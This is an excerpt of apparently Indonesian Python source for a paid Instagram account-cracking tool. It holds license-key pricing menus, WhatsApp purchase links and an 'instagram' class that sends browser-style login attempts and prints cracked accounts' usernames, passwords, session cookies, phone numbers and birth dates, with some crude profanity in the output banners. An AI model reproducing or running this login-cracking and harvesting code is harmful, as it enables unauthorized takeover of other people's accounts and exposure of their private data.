...
os.system("clear")
print("\x1b[1;97m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;97m┃╔═❲  Only Admin Chekout Api Key 081210213378 ❳═>")
print("\x1b[1;97m┃╚═════════════════════════════════")
print("\x1b[1;97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;97m┃╔═❲ List Harga Api Key Tools️ ❳═>")
print("\x1b[1;97m️┃║• Api Key MINGGUAN : 70")
print("\x1b[1;97m️┃║• Api Key 1 Bulan : 120")
print("\x1b[1;97m┃║• Api Key Permanen : 200K")
#print("\x1b[1;97m┃║• Upgrade Ke Pro : 200K")️
print("\x1b[1;97m┃╚═════════════════════════════════")
print("\x1b[1;97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;97m┃╔═❲ Litst Harga Sorce Code️ ❳═>")
print("\x1b[1;97m┃║• Harga File Open code : 300K️")
print("\x1b[1;97m┃NOTE : TIDAK ADA TRIAL")
print("\x1b[1;97m┃╚═════════════════════════════════")
print("\x1b[1;97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

input("\n\x1b[1;97m--> Masukan Api Key Anda Yang Sudah Terdaftar --> Enter")
Password = "MHKUYFFHKKKJTTFFHBFD-HGFDDNKKNCFFJM" # --> Data Req Api key --> open_kt(life)("MSRXXIYNNHLLLEE")
...
while (loop == 'true'):
    ...
    if (passcode == Password):
            ...
            os.system("xdg-open https://wa.me/+6281210213378?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2)
...
▐█·▐█▐▐▌▄▀▀▀█▄ ▐█.▪▄█▀▀█      ·██· ██ ▄▄     {P2}██████████{color_rich}
▐█▌██▐█▌▐█▄▪▐█ ▐█▌·▐█ ▪▐▌    ▪▐█·█▌▐███▌ 
▀▀▀▀▀ █▪ ▀▀▀▀  ▀▀▀  ▀  ▀     •▀▀ ▀▀·▀▀▀  {P2}just {P2}updated {P2}version {kontol_rich}7.0""",width=80,padding=(0,5),style=f"{color_table}"))
...
class instagram:
           ...
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			...
			"trustedDeviceRecords": "{}"}
				...
				if 'userId' in str(xyaa_code):
					...
					tree = Tree("")
					tree.add(f"{H2}nama akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
					tree.add(f"{H2}followers : {H2}{pengikut}")
					tree.add(f"{H2}following : {H2}{mengikut}")
					tree.add(f"{H2}nomor hp  : {H2}{nomor}")
					tree.add(f"{H2}postingan : {H2}{postingan}")
					tree.add(f"{H2}tanggal lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}")
					prints(tree)
					...
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(f"{H2}nama akun : {H2}{nama}")
					tree.add(f"{H2}username  : {H2}{user}")
					tree.add(f"{H2}password  : {H2}{pw}")
					tree.add(f"{H2}followers : {H2}{pengikut}")
					tree.add(f"{H2}following : {H2}{mengikut}")
					tree.add(f"{H2}postingan : {H2}{postingan}\n")
					prints(tree)
	...
	├ Posts
  	 ∟ jumlah Post {CY}{postingan}""")
				...
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print(f"""
    ├ {H2}MANGKANYA GANTENG KONTOL{H2}
	├ {H2}{usr}|{pwd}
	├ Followers {H2}{pengikut}
	├ Following {H2}{mengikut}
	├ Posts
  	 ∟ jumlah Post {H2}{postingan}""")
...
def cek():
	...
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s"%(x)).json()['licenseKey']['key'];login_kamu()
		...
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281210213378?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
...
def beli_bang():
    ...
    elif zxc in ["1","01"]:os.system("xdg-open https://wa.me/+6281210213378?text=assalamualaikum+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:os.system("xdg-open https://wa.me/+6281210213378?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:os.system("xdg-open https://wa.me/+6281210213378?text=assalamualaikum+bang+mau+beli+lisensi+2+bulan");time.sleep(2);exit()
    elif zxc in ["4","04"]:os.system("xdg-open https://wa.me/+6281210213378?text=assalamualaikum+bang+mau+beli+lisensi+permanen");time.sleep(2);exit()
